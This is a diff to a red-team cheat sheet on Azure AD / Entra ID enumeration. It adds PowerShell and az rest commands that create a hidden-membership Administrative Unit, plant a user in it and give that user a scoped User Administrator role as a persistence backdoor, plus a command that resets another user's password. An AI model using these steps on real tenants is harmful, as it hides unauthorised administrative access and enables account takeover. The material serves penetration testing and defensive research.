@@ -6,6 +6,7 @@
 * Devices
 * Service Principals (Application and Managed Identities)
 
+
 ## Users
 
 * List users: `Get-AzureADUser -All $true`
@@ -53,16 +54,83 @@ Rule description: Any Guest user whose secondary email contains the string 'vend
 
 ### Administrative Unit
 
-Administrative Unit can reset password of another user
+Enumerate Administrative Units.
 
-```powershell
+```ps1
 PS AzureAD> Get-AzureADMSAdministrativeUnit -All $true
 PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
 PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
 PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
 PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
 PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl
+```
 
+Administrative Unit can be used as a persistence mechanism. When the `visibility` attribute is set to `HiddenMembership`, only members of the administrative unit can list other members of the administrative unit.
+
+```ps1
+az rest \
+  --method post \
+  --url https://graph.microsoft.com/v1.0/directory/administrativeUnits \
+  --body '{"displayName": "Hidden AU Administrative Unit", "isMemberManagementRestricted":false, "visibility": "HiddenMembership"}'
+```
+
+
+* Create a new Administrative Unit using the `New-MgDirectoryAdministrativeUnit` cmdlet. 
+    ```ps1
+    Connect-MgGraph -Scopes "AdministrativeUnit.ReadWrite.All"
+    Import-Module Microsoft.Graph.Identity.DirectoryManagement
+
+    $params = @{
+        displayName = "Marketing Department"
+        description = "Marketing Department Administration"
+        visibility = "HiddenMembership"
+    }
+
+    New-MgDirectoryAdministrativeUnit -BodyParameter $params
+    ```
+
+* Add a member with `New-MgDirectoryAdministrativeUnitMemberByRef`
+    ```ps1
+    Connect-MgGraph -Scopes "AdministrativeUnit.ReadWrite.All"
+    Import-Module Microsoft.Graph.Identity.DirectoryManagement
+
+    $administrativeUnitId = "0b22c83d-c5ac-43f2-bb6e-88af3016d49f"
+    $paramsUser1 = @{
+        "@odata.id" = "https://graph.microsoft.com/v1.0/users/52e26d18-d251-414f-af14-a4a93123b2b2"
+    }
+    New-MgDirectoryAdministrativeUnitMemberByRef -AdministrativeUnitId $administrativeUnitId -BodyParameter $paramsUser1
+    ```
+
+* List members even when the administrative unit is hidden.
+    ```ps1
+    Connect-MgGraph -Scopes "AdministrativeUnit.Read.All", "Member.Read.Hidden", "Directory.Read.All"
+    Import-Module Microsoft.Graph.Identity.DirectoryManagement
+
+    $administrativeUnitId = "0b22c83d-c5ac-43f2-bb6e-88af3016d49f"
+    Get-MgDirectoryAdministrativeUnitMemberAsUser -AdministrativeUnitId $administrativeUnitId
+    ```
+
+* Assign the `User Administrator` role, its ID is `947ccf23-ee27-4951-8110-96c62c680311` in this tenant.
+    ```ps1
+    Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
+    Import-Module Microsoft.Graph.Identity.DirectoryManagement
+
+    $administrativeUnitId = "0b22c83d-c5ac-43f2-bb6e-88af3016d49f"
+    $userAdministratorRoleId = "947ccf23-ee27-4951-8110-96c62c680311"
+    $params = @{
+        roleId = $userAdministratorRoleId
+        roleMemberInfo = @{
+            id = "61b0d52f-a902-4769-9a09-c6528336b00a"
+        }
+    }
+
+    New-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $administrativeUnitId -BodyParameter $params
+    ```
+* Now the user with the id `61b0d52f-a902-4769-9a09-c6528336b00a` can edit the property of the other users in the Administrative Units.
+
+Administrative Units can reset password of another user.
+
+```powershell
 PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
 PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
 ```
@@ -178,3 +246,5 @@ roadtx findscope -s https://graph.microsoft.com/mail.read
 * [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
 * [AZURE AD INTRODUCTION FOR RED TEAMERS - Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
 * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
+* [Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence - Katie Knowles - September 16, 2024](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)
+* [Create Sticky Backdoor User Through Restricted Management AU - Datadog, Inc](https://stratus-red-team.cloud/attack-techniques/entra-id/entra-id.persistence.restricted-au/)
